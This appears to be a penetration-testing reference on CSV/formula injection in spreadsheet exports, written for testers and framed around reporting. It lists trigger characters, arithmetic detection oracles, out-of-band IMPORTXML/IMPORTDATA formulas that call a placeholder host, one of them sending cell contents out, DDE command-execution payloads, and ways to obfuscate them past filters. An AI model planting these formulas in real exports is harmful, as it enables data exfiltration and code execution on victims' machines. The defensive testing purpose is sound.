# CSV / formula injection catalogue — Open WHEN: a user-controlled value you submit will later be downloaded or exported as CSV/XLSX (invoice templates, user-settings export, audit logs, contact/lead exports, "download report") and opened in a spreadsheet app

## Where it lives

This is a *stored* input-validation flaw, not a direct-response one. The
value you submit (a name, address, note, label, tag) is written verbatim
into a cell of a CSV/XLSX file the app generates later. When a victim
opens that file in Excel / LibreOffice / Google Sheets and a cell starts
with a formula trigger, the spreadsheet engine evaluates it. The web
response to your request usually looks normal — the issue only surfaces
on download.

Test loop:
1. Submit a field value beginning with a formula trigger.
2. Trigger the export (the "download CSV" / "export" feature) and fetch
   the file with `curl`.
3. Inspect the cell. **Finding = the trigger character survived
   unescaped at the start of the cell** (no leading `'`, no leading space,
   no stripped `=`). That alone is the reportable gap — you do not need a
   victim to open it. Note in the finding that a defender should prefix
   risky cells with `'` or sanitize leading `= + - @ Tab CR`.

## Formula triggers (a cell starting with any of these is evaluated)

```
=    +    -    @    <Tab 0x09>    <CR 0x0D>
```

## Detection oracles (safe, non-destructive — prefer these)

Use arithmetic / string formulas. If the downloaded cell shows the
computed value instead of the literal text, the export is injectable:

```
=1+1
=1+1|0          # forces a number in some locales
@SUM(1+1)
=CONCATENATE("a","b")
```

A cell that renders `2` / `ab` instead of `=1+1` / `=CONCATENATE(...)`
confirms evaluation.

## Blind / out-of-band oracle (Google Sheets and some online viewers)

These import functions fetch a remote URL when the sheet recalculates —
a callback to a host you watch confirms blind formula injection and
potential data exfiltration. The app warns the user before contacting an
external resource, so treat this as a *blind oracle*, not silent.

```
=IMPORTXML("http://OOB-HOST/csv","//a/@href")
=IMPORTDATA("http://OOB-HOST/x")
=IMPORTHTML("http://OOB-HOST/x","table",1)
=IMPORTFEED("http://OOB-HOST/x")
=IMPORTRANGE("http://OOB-HOST/x","A1")
```

You can also exfiltrate adjacent cells by concatenating them into the URL,
e.g. `=IMPORTXML(CONCAT("http://OOB-HOST/?d=",A1),"//a")`.

## Command-execution variants (DDE — report, do not detonate)

On Windows Excel with Dynamic Data Exchange enabled, a formula can launch
a local process. Do NOT run these against a real victim machine. Use a
harmless arithmetic oracle to prove evaluation; cite the DDE class in the
finding to convey impact. For reference only:

```
=cmd|'/C calc'!A0
@SUM(1+1)*cmd|'/C calc'!A0
=2+5+cmd|'/C calc'!A0
=rundll32|'URL.dll,OpenURL calc.exe'!A
```

Obfuscation that defeats naive keyword filters (still report-only):
- Prefix arithmetic to hide the lead char: `=AAAA+BBBB-CCCC&cmd|'/c calc.exe'!A`
- Leading spaces before `cmd`.
- Null bytes between letters (`C\x00m\x00D`) — ignored at execution but
  break dictionary filters.

## What to record in the finding

- The exact submitted value and the field it went into.
- The raw exported cell (showing the trigger survived, or showing the
  computed value if the viewer evaluated it).
- Which sanitization is missing (leading-quote prefix / trigger strip).
- Note: defenders should sanitize on export, not only on input.
